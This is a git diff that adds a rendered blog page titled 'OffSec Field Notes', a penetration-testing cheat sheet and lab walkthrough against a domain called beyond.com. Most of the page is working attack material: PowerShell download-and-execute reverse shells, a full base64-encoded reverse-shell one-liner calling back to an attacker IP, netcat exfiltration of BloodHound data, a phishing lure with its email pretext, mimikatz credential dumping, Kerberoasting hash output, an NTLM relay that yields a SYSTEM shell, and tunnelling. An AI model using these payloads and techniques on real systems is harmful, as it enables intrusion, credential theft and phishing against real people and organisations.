@@ -1,0 +1,902 @@
+
+    <article class="git-file-panel" data-git-panel-section="blob" data-git-fragment-path="git/cm-blog-content-staging/blob/content/offsec/operator-shells.md/index.html" data-git-raw-path="git/cm-blog-content-staging/blob/content/offsec/operator-shells.md/raw.txt" data-git-line-count="1029">
+      <header class="git-file-header">
+        <div class="git-file-header-main">
+          <h4 class="git-file-title">operator-shells.md</h4>
+          <div class="git-file-meta">35 KB · 1029 lines · content/offsec/operator-shells.md</div>
+        </div>
+        <div class="git-file-actions">
+          <a class="git-file-action git-file-action--raw" href="./git/cm-blog-content-staging/blob/content/offsec/operator-shells.md/raw.txt" target="_blank" rel="noopener">Raw</a>
+          <button type="button" class="git-file-action git-file-action--copy" data-git-file-copy>Copy</button>
+        </div>
+      </header>
+      <div class="git-file-body" data-git-file-body>
+        <hr>
+<h2>title: OffSec Field Notes — Shells and Tradecraft Snippets
+created: 2023-08-31 04:28:52Z
+updated: 2024-03-20 15:39:41Z</h2>
+<h1>OffSec Field Notes — Shells and Tradecraft Snippets</h1>
+<h2>TLDR;</h2>
+<p>This cheat sheet now captures the extra context from the raw notes: when to use each command, expected output, and follow-up actions.</p>
+<h3>Recon &amp; Enumeration</h3>
+<pre><code># Full TCP sweep with service scripts
+sudo nmap -sC -sV -oA scans/$TARGET $TARGET_IP
+
+# Directory brute force with file extension permutations
+gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config,php,bak -o scans/$TARGET-gobuster.txt
+
+# Stack fingerprinting
+whatweb http://$TARGET_IP
+</code></pre>
+<p>Log discovered hosts in <code>loot/hosts.csv</code> with service notes.</p>
+<h3>Exploit Preparation</h3>
+<pre><code># Search Exploit-DB locally
+searchsploit $SERVICE_NAME
+
+# Convert SSH key for cracking
+ssh2john ~/.ssh/id_rsa &gt; loot/ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo loot/ssh.hash
+</code></pre>
+<p>Document cracked credentials with timestamps and rotation status.</p>
+<h3>Local Enumeration</h3>
+<pre><code># Linux quick hits
+linpeas.sh | tee loot/linpeas-$(hostname).log
+hostname
+id
+ip -a
+
+# Windows quick hits
+winPEASx64.exe &gt; loot/winpeas-$(hostname).log
+systeminfo
+whoami /all
+</code></pre>
+<p>Flag potential privesc leads (SUID, service paths, interesting credentials) in your tracker.</p>
+<h3>SMB &amp; WebDAV</h3>
+<pre><code>crackmapexec smb $TARGET_IP -u john -p &quot;$PASS&quot; --shares
+wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
+</code></pre>
+<p>Use WebDAV to stage payloads for <code>.library-ms</code> lures or WebShells; record URLs.</p>
+<h3>Payload Delivery Snippets</h3>
+<pre><code># Windows library-ms template (trimmed)
+&lt;libraryDescription&gt;...
+    &lt;url&gt;http://$KALI_IP&lt;/url&gt;
+&lt;/libraryDescription&gt;
+
+# PowerShell reverse shell launcher
+powershell.exe -nop -w hidden -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://$KALI_IP:8000/powercat.ps1&#39;); powercat -c $KALI_IP -p $KALI_PORT -e powershell&quot;
+</code></pre>
+<p>Annotate payload hashes and detections encountered.</p>
+<h3>Operator Quality of Life</h3>
+<pre><code class="language-bash">nc -nvlp 4444
+Start-Process -NoNewWindow .\metrtcp.exe
+</code></pre>
+<p>Pair listeners with session logging (<code>script</code>, <code>tmux capture-pane</code>) so you can recover commands later.</p>
+<h3>AD Enumeration &amp; Exfil</h3>
+<pre><code># BloodHound collection
+Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -Domain corp.local -ZipFile .\loot\BH.zip
+
+# Transfer data home
+nc -lp 4445 &gt; bloodhound.zip
+.\nc.exe -w 3 192.168.45.163 4445 &lt; BloodHound.zip
+</code></pre>
+<p>Record collection times, file hashes, and transfer commands to maintain chain-of-custody.</p>
+<p>Keep this sheet close, annotate it as you learn, and fold discoveries back into your playbooks.</p>
+<h2>Working Notes... In Graphic Detail...</h2>
+<h3>Pentest Methodology</h3>
+<p>Port scanning</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -oN $TARGET/nmap $TARGET_IP
+</code></pre>
+<p>Directory enumeration</p>
+<pre><code>gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
+</code></pre>
+<p>Web app identification</p>
+<pre><code>whatweb http://$TARGET_IPhttps://github.com/picocms/Pico
+</code></pre>
+<p>WordPress scan</p>
+<pre><code>wpscan --url http://$TARGET_IP --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+</code></pre>
+<p>Search for public exploits</p>
+<pre><code>searchsploit $SVC_OR_PLGIN_NAME
+</code></pre>
+<p>Crack SSH key passphrases</p>
+<pre><code>ssh2john $KEY_FILE &gt; ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+</code></pre>
+<p>Local enumeration</p>
+<pre><code># Linux
+linpeas.sh
+hostname
+id
+ip -a
+# Windows
+winPEASx64.exe
+    /Basic System Information
+    /AV Information
+    /Network Ifaces and known hosts
+systeminfo
+ipconfig
+hostname
+whoami
+</code></pre>
+<p>SMB enumeration</p>
+<pre><code>crackmapexec smb $TARGET_IP -u john -p &quot;$PASSWD&quot; --shares
+</code></pre>
+<p>Anon WebDAV share</p>
+<pre><code>wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
+</code></pre>
+<p>Windows Library file <code>*.library-ms</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://$KALI_IP&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>Windows shortcut to download PowerCat reverse shell payload</p>
+<pre><code>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://$KALI_IP:8000/powercat.ps1&#39;); powercat -c $KALI_IP -p $KALI_PORT -e powershell&quot;
+</code></pre>
+<p>Netcat listener</p>
+<pre><code class="language-bash">nc -nvlp 4444
+</code></pre>
+<p><strong>Swaks email phishing</strong>
+Create <code>body.txt</code> with pretext, example:</p>
+<pre><code>Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I&#39;ll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+</code></pre>
+<ul>
+<li>This may convince our target to open the attachment.<ul>
+<li><em>In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.</em>.</li>
+</ul>
+</li>
+</ul>
+<p>Build command</p>
+<pre><code class="language-bash">sudo swaks -t $VALID_RECIPIENT_0 -t $VALID_RECIPIENT_1 --from $VALID_EMAIL_ADDRESS --attach @config.Library-ms --server $MAIL_SRV_IP --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap
+</code></pre>
+<p><strong>AD Enumeration</strong>
+Upload SharpHound collector.</p>
+<pre><code>iwr -uri http://$KALI_IP:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+</code></pre>
+<p>Transfer to Kali</p>
+<pre><code># Kali
+nc -lp 4445 &gt; bloodhound.zip
+# Target
+.\nc.exe -w 3 192.168.45.163 4445 &lt; BloodHound.zip
+</code></pre>
+<p>Start <code>neo4j</code>, <code>bloodhound</code>, and &quot;upload data&quot;</p>
+<pre><code class="language-bash">sudo neo4j start
+bloodhound &amp;
+</code></pre>
+<p>Basic enumeration raw queries</p>
+<pre><code># Display domain connected computers
+MATCH (m:Computer) RETURN m
+# Display domain users
+MATCH (m:User) RETURN m
+# Display active user sessions
+MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p
+</code></pre>
+<p><strong>Detact PowerShell Process</strong>
+Will not die if original shell fails</p>
+<pre><code>Start-Process -NoNewWindow .\metrtcp.exe
+</code></pre>
+<p><strong>Meterpreter Autoroute &amp; SOCKS5 Proxy</strong></p>
+<pre><code>msf6 &gt; use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) &gt; set session 1
+session =&gt; 1
+msf6 post(multi/manage/autoroute) &gt; run
+msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1
+SRVHOST =&gt; 127.0.0.1
+msf6 auxiliary(server/socks_proxy) &gt; set VERSION 5
+VERSION =&gt; 5
+msf6 auxiliary(server/socks_proxy) &gt; run -j
+</code></pre>
+<p><strong>Meterpreter Migrate</strong></p>
+<pre><code>execute -H -f notepad.exe
+(proc created 1500)
+migrate 1500
+</code></pre>
+<p>With the SOCKS5 proxy active we can configure proxychains to access the internal network.</p>
+<pre><code>socks5          127.0.0.1 1080
+</code></pre>
+<p><strong>SMB Credential Spray Internal Network via Proxy</strong>
+Example:</p>
+<pre><code class="language-bash">sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p &quot;dqsTwTpZPn#nL&quot; --shares
+</code></pre>
+<p><strong>Nmap Internal Network via Proxy</strong>
+Example:</p>
+<pre><code class="language-bash">sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
+</code></pre>
+<p><strong>Chisel Proxy Connections</strong>
+<a href="https://github.com/jpillora/chisel">Chisel</a></p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ gunzip chisel_1.9.0_linux_amd64.gz
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ mv chisel_1.9.0_linux_amd64 chisel
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ file chisel
+chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=jGqNcOxUVIlhmjt2owNC/py0c32hpuO79Sykl3kHD/FZVs4pG8bg5V4LUlZY9Y/lFf4TEBORjLxICoiMGrZ, stripped
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ chmod a+x chisel
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]dcom ports
+└─$ ./chisel server --port 8080 --reverse
+2023/12/30 13:53:39 server: Reverse tunnelling enabled
+2023/12/30 13:53:39 server: Fingerprint vUZ4fX/iMvelnGlgbmMUxddmoyO2m1/D7/9Hy8gKbQ4=
+2023/12/30 13:53:39 server: Listening on http://0.0.0.0:8080
+</code></pre>
+<p>From our target shell we can run Chisel in client mode to connect back to Kali on port 8080 by creating a reverse port forward with syntax <code>R:localport:remotehost:remoteport</code>.</p>
+<pre><code>meterpreter &gt; shell
+Process 7884 created.
+Channel 55 created.
+Microsoft Windows [Version 10.0.22000.978]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\marcus&gt;chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
+chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
+2023/12/30 14:10:54 client: Connecting to ws://192.168.45.163:8080
+2023/12/30 14:10:55 client: Connected (Latency 78.2679ms)
+</code></pre>
+<ul>
+<li>Bind INTERNALSRV1 port 80 to Kali port 80.<ul>
+<li><em>NOTE: kill wsgidav server first</em>.</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ ./chisel server --port 8080 --reverse
+2023/12/30 14:03:01 server: Reverse tunnelling enabled
+2023/12/30 14:03:01 server: Fingerprint D8xrjq850tcudK3gJ2HmABSmOEjGVwsL1TpTmahCJWo=
+2023/12/30 14:03:01 server: Listening on http://0.0.0.0:8080
+2023/12/30 14:10:55 server: session#36: tun: proxy#R:81=&gt;172.16.87.241:80: Listening
+</code></pre>
+<ul>
+<li>With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.</li>
+</ul>
+<p><strong>Mimikatz Cached Creds</strong></p>
+<pre><code class="language-bash">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+</code></pre>
+<p><strong>Lateral Movement via Impacket-psexec</strong>
+Example:</p>
+<pre><code>proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
+</code></pre>
+<p><strong>Kerberoasting with Impacket</strong>
+We can Kerberoasting from Kali with <code>impacket-GetUserSPNs</code> over our SOCKS5 proxy.  To obtain the TGS-REP hash of <code>daniela</code> we need to provide the creds of a domain user, so we will use <code>john</code>.
+Example:</p>
+<pre><code>proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
+----------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2022-09-29 01:17:20.062328  2022-10-05 00:59:48.376728
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289cbf2$14d33d1eaa975da1b090c3de10c70319f6fc59c3ab31a35e956601901575a2d697baaef3d2147bfd4dae43aab19ed82300ed47ccf9925cd246711ebedbc9635fa876b85131b4b3fa11386393a59f4a8c58c69cfbe947959953fafb08a73032b382cc911daa1860e411099e12c42d49568e0410115bf6d841a7b0b8876dd4449ee94e87f48112504b419c3f6ba64edba7cc2c2e16147a8996524ea98f4a56cd7c19a017cf5f212c9292a8d12ca314e996e13da71800715b6a922379d50deceac9ca0c101f2282c3168e9b10adadccfa63740de5c2d819aba279919272163d4041246d7eaf4cfed29379b3b3e557b12a0427819280fa71a4c2e02eb8c4435be17554b2ff6014919ca6da594fed553be047470379133ab689886a31b8d9090ef1a8c221e2a99b912a6b331ab86bb9f398655f2880a096fb40fd7f498bea77acda21b83bb762c3ebd2ee40acf25e9a3aa8d770e0997f1635cd0e3c02dbe6b1956defcb0dca884248190a5e67c077c2d8c042c94fcc9c5122ccf9996693ddaec616828d83bf2dcc8f923f368fe542f04c4dfd03d8bbf31c96e65d971ea6f991a2def70bd04e2313225bcc3aa5380c40525d055ed28f817208d0bfc690916ef509f0bc147045132e7bb08f963e624ee48b0cf5c0160dddb9c496e23ac8b5a3f10c65a91f1225ada552d40af5503966e49e9f15993b8ac98b6d8a3c532c9b8909ea7f8338930f312cf295b0012bd92da3ee44404234f53123f25070b9531d1fbdf50bf04724748b07326b999117b6f7c93dd89b474ee63cbcf40fd2843739e49e16d25df66d6c6daf727479378667178c89de6d11be01e5a0d91dfa4b44ae77d8764be7e44058f24a85d3ab9046ce87933e2d3a7aba23e3c6a850e5390f10f3a343a5bdff3754be06719d5a8e83218b6330513db0f9d3d38c04b9007290c9bf00d8b80be650fa407205734978b0cbe11dadd3dce07c258f63db8f7154c181b449d6c10312e6c83d34ff46ecc500bbb2c298232963abb2f889e4423a702486d91d5b1edabc4603029f69d9afea5572c83edf911a044e867bc098368d49be3164346d3906197e46c761b511038e10ede277eb90d6be09569c7c45c344f011e1142d3b4b5ee05678f487e4c01295cfe7b1bc9022ca0af9ecee463d75370d190156e9915b286e3f811ac8b27ef6ac69c166fb02947c5303e760e840849d7259980eabc8d33df0d27b4555ca57bfb8b1dca91bf957a1d8c9b8facac0a23ef05355f54d27f35255e551ac8aa76e37b9be40aa1b4df5ccb5d5b71e12025b844782c36a44dd71d3a174373c9a776e4f0cfdcbf36445edd105291212101cd71de93b8d56882727
+</code></pre>
+<p>Store the hash to <code>daniela.hash</code> an crack with Hashcat.</p>
+<pre><code class="language-bash">sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+</code></pre>
+<p><strong>Impacket SMB Relay Attack</strong>
+Can be utilized in any case where an auth request can be forced:</p>
+<ul>
+<li>Web app backup plugin path.</li>
+<li>SMB requests.</li>
+</ul>
+<p>First we need to setup the <code>impacket-ntlmrelayx</code> before we modify the backup directory path of the WP plugin.  Use <code>--no-http-server</code> and <code>-smb2support</code> to disable the HTTP server and enable SMB2 support.  We need to specify the external address of MAILSRV1 as the target of our relay attack, so we won&#39;t have to proxy via proxychains.  We&#39;ll also base64-encode the PowerShell reverse shell <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">oneliner</a> to connect back to our attacking system on port 9999 and provide it as a command to <code>-c</code>.</p>
+<pre><code># PowerShell One-liner
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&gt; $Text = &#39;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.45.163&quot;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+
+# Bse64 Encode
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ echo -n &#39;$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.45.163&#39;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39; | base64
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgxOTIuMTY4
+LjQ1LjE2Myw5OTk5KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRl
+cyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5
+dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVt
+LlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0g
+KGlleCAiLiB7ICRkYXRhIH0gMj4mMSIgfCBPdXQtU3RyaW5nICk7ICRzZW5kYmFjazIgPSAkc2Vu
+ZGJhY2sgKyBQUyAgKyAocHdkKS5QYXRoICsg
+
+# Setup NTLM Relay
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.242 -c &quot;powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC &lt;....
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client RPC loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+</code></pre>
+<p>Next we need a Netcat listener to catch the reverse shell.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
+└─$ nc -lnvp 9999
+listening on [any] 9999 ...
+</code></pre>
+<p>With everything setup we can modify the Backup directory path.</p>
+<p>Set the path to the URI reference <code>//192.168.45.163/test</code> where the IP is our Kali machine and <code>/test</code> is a nonexistent path.
+<img src="../_resources/156b67d1d13a6a7b87d4587904efcffa.png" alt="156b67d1d13a6a7b87d4587904efcffa.png"></p>
+<ul>
+<li>Once entered scroll down and click Save.<ul>
+<li>This causes the WP plugin to auth to our <code>impacket-ntlmrelayx</code> in the context of the user running WP.</li>
+</ul>
+</li>
+</ul>
+<pre><code>[*] Authenticating against smb://192.168.201.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
+...
+[*] SMBD-Thread-33 (process_request_thread): Connection from 192.168.201.242 controlled, but there are no more targets left!
+[*] Executed specified command on host: 192.168.201.242
+[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
+[*] Stopping service RemoteRegistry
+</code></pre>
+<ul>
+<li>This confirms our 2 assumptions.<ul>
+<li>INTERNALSRV1/ADMINISTRATOR was used to perform auth.</li>
+<li>Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.</li>
+</ul>
+</li>
+</ul>
+<p>The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
+└─$ nc -lnvp 9999
+listening on [any] 9999 ...
+connect to [192.168.45.163] from (UNKNOWN) [192.168.201.242] 53368
+
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+PS C:\Windows\system32&gt; hostname
+MAILSRV1
+PS C:\Windows\system32&gt;
+</code></pre>
+<ul>
+<li>We have obtained code execution as NT AUTHORITY\SYSTEM by authenticating as local admin on MAILSRV1.<ul>
+<li>Achieved by relaying an auth attempt from WP plugin on INTERNALSRV1.</li>
+</ul>
+</li>
+</ul>
+<h3>Shells</h3>
+<h4>Resources</h4>
+<p><a href="https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
+<p><a href="https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da">https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da</a></p>
+<p><a href="https://nmap.org/ncat/guide/index.html">https://nmap.org/ncat/guide/index.html</a></p>
+<hr>
+<h4>Enumeration</h4>
+<h5>Web Servers</h5>
+<p>Always start with Nmap...</p>
+<pre><code class="language-bash">sudo nmap -v -O -sV -p 1-65535 192.168.X.X
+</code></pre>
+<ul>
+<li>Check out service versions with <code>searchsploit</code><ul>
+<li>Inspect result with <code>searchsploit -x XXXX</code></li>
+<li>Clone to pwd with <code>searchsploit -m XXXX</code></li>
+</ul>
+</li>
+<li>Search scripts with <code>nmap --script-help &quot;*&quot; | less</code></li>
+<li>Follow up with <code>--script</code> scans on relevant services.
+And then Gobuster <em>(Especially helpful for IIS servers)</em>.</li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/]
+└─$ gobuster dir -x .pdf,.txt,.php -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
+</code></pre>
+<ul>
+<li>Add a <code>-x</code> to seach for common file extensions.<ul>
+<li>Example: <code>-x .pdf,.txt,.php</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4>Encoding</h4>
+<h5>Base64</h5>
+<h6>Bash</h6>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ echo -n &quot;test@supermagicorg.com&quot; | base64
+dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
+
